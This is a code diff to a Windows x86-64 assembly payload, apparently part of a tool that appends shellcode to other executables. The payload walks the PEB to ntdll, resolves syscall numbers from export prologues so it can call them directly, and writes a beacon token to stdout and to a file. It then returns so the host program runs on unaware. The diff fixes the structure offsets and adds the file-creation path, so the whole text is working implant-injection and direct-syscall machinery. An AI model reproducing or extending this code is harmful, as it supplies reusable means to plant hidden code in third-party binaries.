@@ -2,12 +2,16 @@
 ;
 ;   The host-coupling variant of the windows payload. Entered as a function
 ;   call from the appender's trampoline (see tools/append_pe.py), it saves
-;   every general register, walks the PEB to ntdll, reads NtWriteFile's
-;   syscall number from the export prologue (`mov eax,nr; syscall` — no
-;   hardcoded nr, same machinery as sleepmask.asm), writes a beacon token on
-;   the process's stdout handle (PEB->Params->StandardOutput), restores
-;   everything, and `ret`s so the host binary continues as if nothing
-;   happened.
+ ;   every general register, walks the PEB to ntdll, and reads every syscall
+ ;   number it needs from the export prologue (`mov eax,nr; syscall` — no
+ ;   hardcoded nr, same machinery as sleepmask.asm). It then fires the beacon
+ ;   TWO ways so it is provable "no matter what": (1) NtWriteFile on the
+ ;   process's stdout handle (PEB->Params->StandardOutput), and (2) a
+ ;   filesystem artifact — NtCreateFile + NtWriteFile + NtClose on
+ ;   "sleepmask_beacon.txt" in the current working directory. The file path is
+ ;   best-effort (if NtCreateFile / NtClose are unresolvable it is skipped,
+ ;   stdout still fires). Everything is restored and it `ret`s so the host
+ ;   binary continues as if nothing happened.
 ;
 ;   PIC: base (r12) resolved at entry via call/pop; every data reference is
 ;   [r12 + (label - sym_base)], which nasm folds to a constant displacement.
@@ -45,18 +49,18 @@ sym_base:
     mov [r12 + (ntdll_base - sym_base)], rax
     mov rax, [gs:0x60]
     mov rax, [rax + 0x18]
-    lea r14, [rax + 0x08]
+    lea r14, [rax + 0x10]
     mov r13, [r14]
 .peb_walk:
-    mov rsi, [r13 + 0x58]
-    mov rdx, [r13 + 0x50]
+    mov rsi, [r13 + 0x60]
+    mov rdx, [r13 + 0x58]
     shr rdx, 1
     lea r8, [r12 + (s_ntdll_u16 - sym_base)]
     mov r9, 9
     call cmp_u16_ci
     test rax, rax
     jz .peb_next
-    mov rax, [r13 + 0x60]
+    mov rax, [r13 + 0x30]
     mov [r12 + (ntdll_base - sym_base)], rax
     jmp .peb_next
 .peb_next:
@@ -76,17 +80,17 @@ sym_base:
     lea r10, [r10 + 0x18]
     mov r11d, [r10 + 0x70]
     add r11, [r12 + (ntdll_base - sym_base)]
-    mov r10d, [r11 + 0x10]
+    mov r10d, [r11 + 0x18]
     mov [r12 + (num_names - sym_base)], r10
-    mov r9d, [r11 + 0x14]
+    mov r9d, [r11 + 0x1C]
     mov r10, [r12 + (ntdll_base - sym_base)]
     add r10, r9
     mov [r12 + (eat_base - sym_base)], r10
-    mov r9d, [r11 + 0x18]
+    mov r9d, [r11 + 0x20]
     mov r10, [r12 + (ntdll_base - sym_base)]
     add r10, r9
     mov [r12 + (ent_base - sym_base)], r10
-    mov r9d, [r11 + 0x1C]
+    mov r9d, [r11 + 0x24]
     mov r10, [r12 + (ntdll_base - sym_base)]
     add r10, r9
     mov [r12 + (ord_base - sym_base)], r10
@@ -126,6 +130,83 @@ sym_base:
     mov eax, [r12 + (data_nr - sym_base)]
     syscall
     add rsp, 0x50
+
+    ; ---- 7. resolve NtCreateFile + NtClose (best effort) ------------------
+    lea rsi, [r12 + (s_ntcreate - sym_base)]
+    mov rdx, 12
+    call find_export
+    mov [r12 + (ntcreate_fn - sym_base)], rax
+    test rax, rax
+    jz .file_done
+    mov rsi, rax
+    call sysnr_from
+    mov [r12 + (nr_create - sym_base)], rax
+
+    lea rsi, [r12 + (s_ntclose - sym_base)]
+    mov rdx, 7
+    call find_export
+    mov [r12 + (ntclose_fn - sym_base)], rax
+    test rax, rax
+    jz .file_done
+    mov rsi, rax
+    call sysnr_from
+    mov [r12 + (nr_close - sym_base)], rax
+
+    ; ---- 8. UNICODE_STRING "sleepmask_beacon.txt" + OBJECT_ATTRIBUTES -----
+    mov word [r12 + (file_us - sym_base)], 40
+    mov word [r12 + (file_us - sym_base) + 2], 40
+    lea rax, [r12 + (filename_u16 - sym_base)]
+    mov [r12 + (file_us - sym_base) + 8], rax
+    mov dword [r12 + (oa - sym_base)], 0x30
+    lea rax, [r12 + (file_us - sym_base)]
+    mov [r12 + (oa - sym_base) + 0x10], rax
+    mov dword [r12 + (oa - sym_base) + 0x18], 0x40
+
+    ; ---- 9. NtCreateFile(&fh_out, 0x12019F, &oa, &iosb, 0, 0x80, 7, 2, ..)
+    xor rax, rax
+    mov [r12 + (fh_out - sym_base)], rax
+    sub rsp, 0x58
+    lea rax, [r12 + (fh_out - sym_base)]
+    mov rcx, rax
+    mov edx, 0x12019F
+    lea r8, [r12 + (oa - sym_base)]
+    lea r9, [r12 + (iosb - sym_base)]
+    mov qword [rsp + 0x20], 0
+    mov qword [rsp + 0x28], 0x80
+    mov qword [rsp + 0x30], 7
+    mov qword [rsp + 0x38], 2
+    mov qword [rsp + 0x40], 0x42
+    mov qword [rsp + 0x48], 0
+    mov qword [rsp + 0x50], 0
+    mov eax, [r12 + (nr_create - sym_base)]
+    syscall
+    add rsp, 0x58
+
+    ; ---- 10. if it opened, write the token to the file, then close --------
+    mov rax, [r12 + (fh_out - sym_base)]
+    test rax, rax
+    jz .file_done
+    sub rsp, 0x50
+    lea r9, [r12 + (iosb - sym_base)]
+    mov [rsp + 0x20], r9
+    lea r9, [r12 + (msg - sym_base)]
+    mov [rsp + 0x28], r9
+    mov dword [rsp + 0x30], msglen
+    mov r9d, 0
+    mov [rsp + 0x38], r9
+    mov [rsp + 0x40], r9
+    mov rcx, [r12 + (fh_out - sym_base)]
+    xor rdx, rdx
+    xor r8d, r8d
+    mov eax, [r12 + (data_nr - sym_base)]
+    syscall
+    add rsp, 0x50
+    sub rsp, 8
+    mov rcx, [r12 + (fh_out - sym_base)]
+    mov eax, [r12 + (nr_close - sym_base)]
+    syscall
+    add rsp, 8
+.file_done:
 .done:
     pop r15
     pop r14
@@ -288,7 +369,17 @@ num_names:    resq 1
 ntwrite_fn:   resq 1
 stdout_hdl:   resq 1
 data_nr:      resq 1
+ntcreate_fn:  resq 1
+ntclose_fn:   resq 1
+nr_create:    resq 1
+nr_close:     resq 1
+fh_out:       resq 1
+file_us:      resq 2
+oa:           resq 6
 s_ntwrite:    db "NtWriteFile", 0
+s_ntcreate:   db "NtCreateFile", 0
+s_ntclose:    db "NtClose", 0
 s_ntdll_u16:  dw 'n','t','d','l','l','.','d','l','l'
+filename_u16: dw 's','l','e','e','p','m','a','s','k','_','b','e','a','c','o','n','.','t','x','t'
 msg:          db "sleepmask: coupled | windows x86-64 | host continues", 0x0a
 msglen        equ $ - msg
